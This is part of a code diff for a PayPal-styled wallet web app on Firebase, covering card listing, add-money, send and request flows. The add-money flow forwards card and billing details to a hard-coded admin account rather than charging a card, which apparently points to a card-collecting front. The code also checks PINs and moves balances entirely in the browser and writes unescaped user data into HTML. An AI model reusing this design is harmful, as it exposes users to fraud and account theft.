+    list.innerHTML='<div style="background:#fff;border-radius:14px;padding:20px;text-align:center;color:#999;font-size:14px;box-shadow:0 1px 6px rgba(0,0,0,0.06);">No cards linked yet — tap Add New to get started</div>';
+    return;
+  }
+  const brandColors={Visa:'#1a1f71',Mastercard:'#eb001b',Amex:'#007bc1','Apple Pay':'#111',Default:'#4a4a4a'};
+  cards.forEach((card,rawIdx)=>{
+    const allCards=userData.linkedCards||[];
+    const realIdx=allCards.indexOf(card);
+    const color=brandColors[card.brand]||brandColors.Default;
+    const isAuth=card.status==='authorized';
+    const isPend=card.status==='pending'||card.status==='otp_required';
+    const badgeClass=isAuth?'authorized':isPend?'checking':'pending';
+    const badgeText=isAuth?'✓ Authorized':isPend?'Checking':'Pending';
+    const tile=document.createElement('div');
+    tile.className='pp-card-tile';
+    tile.innerHTML=`
+      <div class="pp-card-tile-color" style="background:${color};"></div>
+      <div class="pp-card-tile-body">
+        <div class="pp-card-tile-top">
+          <div>
+            <div class="pp-card-brand">${card.brand}</div>
+            <div class="pp-card-num">•••• •••• •••• ${card.lastFour}</div>
+          </div>
+          <span class="pp-card-status-badge ${badgeClass}">${badgeText}</span>
+        </div>
+        <div class="pp-card-tile-actions">
+          <button class="pp-card-remove-btn" onclick="removeCard(${realIdx})">Remove</button>
+        </div>
+      </div>`;
+    list.appendChild(tile);
+  });
+}
+
+// ============================================================
+// ADD MONEY FLOW
+// ============================================================
+let addMoneyCardIndex=-1;
+
+document.getElementById('add-money-btn').onclick=async function(){
+  addMoneyCardIndex=-1;
+  const ud=await get(userDataRef).then(s=>s.val());
+  const authCards=(ud?.linkedCards||[]).filter(c=>c.status==='authorized');
+  const sourceList=document.getElementById('addmoney-source-list');
+  const amtSection=document.getElementById('addmoney-amount-section');
+  amtSection.style.display='none';
+  document.getElementById('addmoney-error').textContent='';
+  document.getElementById('addmoney-amount').value='';
+  document.getElementById('addmoney-pin').value='';
+  sourceList.innerHTML='';
+
+  if(!authCards.length){
+    sourceList.innerHTML='<div style="padding:20px;text-align:center;color:#999;font-size:14px;">No authorized cards. Please link and verify a card first.</div>';
+  }else{
+    const h=document.createElement('p');
+    h.style.cssText='font-size:14px;color:#555;margin-bottom:12px;';
+    h.textContent='Choose a card to add money from:';
+    sourceList.appendChild(h);
+    authCards.forEach((card,i)=>{
+      const allCards=ud.linkedCards||[];
+      const realIdx=allCards.filter(c=>c.status==='authorized').indexOf(card);
+      const opt=document.createElement('div');
+      opt.className='pp-addmoney-opt';
+      opt.innerHTML=`<span class="pp-addmoney-opt-icon">💳</span><div><div class="pp-addmoney-opt-label">${card.brand} •••• ${card.lastFour}</div><div class="pp-addmoney-opt-sub">Authorized card</div></div>`;
+      opt.onclick=function(){
+        document.querySelectorAll('.pp-addmoney-opt').forEach(o=>o.classList.remove('selected'));
+        opt.classList.add('selected');
+        addMoneyCardIndex=allCards.indexOf(card);
+        document.getElementById('addmoney-selected-card-info').textContent='Adding from: '+card.brand+' •••• '+card.lastFour;
+        amtSection.style.display='block';
+      };
+      sourceList.appendChild(opt);
+    });
+  }
+  document.getElementById('add-money-modal').style.display='flex';
+};
+
+document.getElementById('close-add-money').onclick=()=>document.getElementById('add-money-modal').style.display='none';
+
+document.getElementById('addmoney-confirm-btn').onclick=async function(){
+  const amt=parseFloat(document.getElementById('addmoney-amount').value);
+  const pin=document.getElementById('addmoney-pin').value.trim();
+  const err=document.getElementById('addmoney-error');
+  err.textContent='';
+  if(!amt||amt<=0)return err.textContent='Please enter a valid amount.';
+  if(!pin||pin.length!==4)return err.textContent='Please enter your 4-digit PIN.';
+  if(addMoneyCardIndex<0)return err.textContent='Please select a card.';
+  const ud=await get(userDataRef).then(s=>s.val());
+  if(!ud)return;
+  if(ud.pin!==pin)return err.textContent='Incorrect PIN.';
+  const card=ud.linkedCards?.[addMoneyCardIndex];
+  if(!card||card.status!=='authorized')return err.textContent='Card not authorized.';
+  const sym=currencySymbols[ud.currency||'USD']||'$';
+  // Send request to admin as notification
+  const allSnap=await get(ref(db,'users'));
+  let adminUid=null;
+  allSnap.forEach(s=>{if(s.val().email==='admin@gmail.com')adminUid=s.key;});
+  if(adminUid){
+    await sendNotificationToUser(adminUid,
+      `💰 ADD MONEY REQUEST\nUser: ${ud.firstname} ${ud.surname} (${ud.email})\nAmount: ${sym}${amt}\nCard: ${card.brand} •••• ${card.lastFour}\nBilling: ${card.billingAddress?.street||''}, ${card.billingAddress?.city||''}, ${card.billingAddress?.country||''}`
+    );
+  }
+  document.getElementById('add-money-modal').style.display='none';
+  alert(`✅ Request sent! Admin will process your add money request of ${sym}${amt} shortly.`);
+};
+
+// ============================================================
+// SEND/REQUEST TAB
+// ============================================================
+document.getElementById('sr-recipient').oninput=async function(){
+  const val=this.value.trim();
+  const info=document.getElementById('sr-recipient-info');
+  if(val.length===10){
+    const snap=await get(ref(db,'accountNumbers/'+val));
+    if(snap.exists()){
+      const uid=snap.val();
+      const us=await get(ref(db,'users/'+uid)).then(s=>s.val());
+      info.style.display='block';
+      info.textContent='✓ '+us.firstname+' '+us.surname;
+    }else{
+      info.style.display='block';
+      info.textContent='Account not found';
+      info.style.color='#e53935';
+    }
+  }else{
+    info.style.display='none';
+  }
+};
+
+document.getElementById('sr-send-btn').onclick=async function(){
+  const rec=document.getElementById('sr-recipient').value.trim();
+  const amt=parseFloat(document.getElementById('sr-amount').value);
+  const pin=document.getElementById('sr-pin').value.trim();
+  const err=document.getElementById('sr-send-error');
+  err.textContent='';
+  if(!rec||rec.length!==10)return err.textContent='Enter a valid 10-digit account number.';
+  if(!amt||amt<=0)return err.textContent='Enter a valid amount.';
+  if(!pin||pin.length!==4)return err.textContent='Enter your PIN.';
+  const ud=await get(userDataRef).then(s=>s.val());
+  if(ud.pin!==pin)return err.textContent='Incorrect PIN.';
+  if(ud.balance<amt)return err.textContent='Insufficient balance.';
+  const snap=await get(ref(db,'accountNumbers/'+rec));
+  if(!snap.exists())return err.textContent='Recipient not found.';
+  const recUid=snap.val();
+  const sym=currencySymbols[ud.currency||'USD']||'$';
+  await runTransaction(userDataRef,u=>{
+    if(u){u.balance=(u.balance||0)-amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Sent',amount:amt,to:rec,senderName:'You'});return u;}return u;
+  });
+  await runTransaction(ref(db,'users/'+recUid),u=>{
+    if(u){u.balance=(u.balance||0)+amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Received',amount:amt,from:ud.accountNumber,senderName:ud.firstname+' '+ud.surname});return u;}return u;
+  });
+  await sendNotificationToUser(recUid,'💸 You received '+sym+amt+' from '+ud.firstname+' '+ud.surname+'.');
+  document.getElementById('sr-recipient').value='';
+  document.getElementById('sr-amount').value='';
+  document.getElementById('sr-pin').value='';
+  document.getElementById('sr-recipient-info').style.display='none';
+  alert('✅ Sent '+sym+amt+' successfully!');
+};
+
+// REQUEST MONEY
+document.getElementById('rq-account').oninput=async function(){
+  const val=this.value.trim();
+  const info=document.getElementById('rq-user-info');
+  if(val.length===10){
+    const snap=await get(ref(db,'accountNumbers/'+val));
+    if(snap.exists()){
+      const us=await get(ref(db,'users/'+snap.val())).then(s=>s.val());
+      info.style.display='block';
+      info.textContent='✓ '+us.firstname+' '+us.surname;
+      info.style.color='#1a56ff';
+    }else{
+      info.style.display='block';
+      info.textContent='Account not found';
+      info.style.color='#e53935';
+    }
+  }else{
+    info.style.display='none';
+  }
+};
+
+document.getElementById('rq-send-btn').onclick=async function(){
+  const acct=document.getElementById('rq-account').value.trim();
+  const amt=parseFloat(document.getElementById('rq-amount').value);
+  const note=document.getElementById('rq-note').value.trim();
+  const err=document.getElementById('rq-error');
+  err.textContent='';
+  if(!acct||acct.length!==10)return err.textContent='Enter a valid account number.';
+  if(!amt||amt<=0)return err.textContent='Enter a valid amount.';
+  const snap=await get(ref(db,'accountNumbers/'+acct));
+  if(!snap.exists())return err.textContent='User not found.';
+  const targetUid=snap.val();
+  const ud=await get(userDataRef).then(s=>s.val());
+  const sym=currencySymbols[ud.currency||'USD']||'$';
+  await sendNotificationToUser(targetUid,
+    `📩 Money Request: ${ud.firstname} ${ud.surname} is requesting ${sym}${amt} from you.${note?' Note: '+note:''} Their account: ${ud.accountNumber}`
+  );
+  document.getElementById('rq-account').value='';
+  document.getElementById('rq-amount').value='';
+  document.getElementById('rq-note').value='';
+  document.getElementById('rq-user-info').style.display='none';
+  alert('✅ Request sent! They will receive a notification.');
+};
+
+// Offers tab card button
+document.getElementById('offer-add-card-btn').onclick=()=>{
+  switchTab('tab-accounts',document.querySelector('[data-tab="tab-accounts"]'));
+  document.getElementById('card-options-modal').style.display='flex';
+};
+
+// Update drawer user info when data loads
+function updateDrawerInfo(userData){
+  const dn=document.getElementById('drawer-username');
+  const de=document.getElementById('drawer-email');
+  if(dn)dn.textContent=(userData.firstname||'')+' '+(userData.surname||'');
+  if(de)de.textContent=userData.email||'';
+  const ob=document.getElementById('offer-bonus-label');
+  if(ob){const sym=currencySymbols[userData.currency||'USD']||'$';ob.textContent=sym+'10';}
+}
 
 </script>
 </body>
